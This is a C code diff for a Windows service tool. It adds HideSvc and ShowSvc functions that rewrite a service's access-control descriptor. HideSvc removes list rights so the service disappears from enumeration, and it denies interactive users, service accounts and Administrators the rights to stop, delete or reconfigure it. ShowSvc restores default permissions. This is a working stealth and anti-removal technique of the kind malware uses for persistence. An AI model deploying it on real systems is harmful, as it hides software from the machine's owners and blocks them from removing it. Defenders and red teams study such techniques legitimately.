@@ -149,3 +149,45 @@ VOID UpdateSvc(SC_HANDLE SCManager)
     CloseServiceHandle(SCManager);
     CloseServiceHandle(handlerSvc);
 }
+
+VOID HideSvc(SC_HANDLE SCManager)
+{
+    (void)SCManager;
+    SC_HANDLE handlerSvc = OpenService(SCManager, SVC_NAME, WRITE_DAC);
+    if (handlerSvc == NULL)
+    {
+        CloseServiceHandle(SCManager);
+        exit(PrintError());
+    }
+    LPCSTR aceStr = "D:(D;;DCWPDTSD;;;IU)(D;;DCWPDTSD;;;SU)(D;;DCWPDTSD;;;BA)(A;;CCSWLOCRRC;;;IU)(A;;CCSWLOCRRC;;;SU)(A;;CCSWRPWPDTLOCRRC;;;SY)(A;;CCDCSWRPWPDTLOCRSDRCWDWO;;;BA)";
+    PSECURITY_DESCRIPTOR secDesc;
+    ULONG secDescsz = 0;
+    BOOL success = ConvertStringSecurityDescriptorToSecurityDescriptorA(aceStr, SDDL_REVISION_1, &secDesc, &secDescsz);
+    if (success == FALSE) exit(PrintError());
+    success = SetServiceObjectSecurity(handlerSvc, DACL_SECURITY_INFORMATION, secDesc);
+    if (success == FALSE)  exit(PrintError());
+    else printf("Service updated successfully.\n");
+    CloseServiceHandle(SCManager);
+    CloseServiceHandle(handlerSvc);
+}
+
+VOID ShowSvc(SC_HANDLE SCManager)
+{
+    (void)SCManager;
+    SC_HANDLE handlerSvc = OpenService(SCManager, SVC_NAME, WRITE_DAC);
+    if (handlerSvc == NULL)
+    {
+        CloseServiceHandle(SCManager);
+        exit(PrintError());
+    }
+    LPCSTR aceStr = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
+    PSECURITY_DESCRIPTOR secDesc;
+    ULONG secDescsz = 0;
+    BOOL success = ConvertStringSecurityDescriptorToSecurityDescriptorA(aceStr, SDDL_REVISION_1, &secDesc, &secDescsz);
+    if (success == FALSE) exit(PrintError());
+    success = SetServiceObjectSecurity(handlerSvc, DACL_SECURITY_INFORMATION, secDesc);
+    if (success == FALSE) exit(PrintError());
+    else printf("Service updated successfully.\n");
+    CloseServiceHandle(SCManager);
+    CloseServiceHandle(handlerSvc);
+}
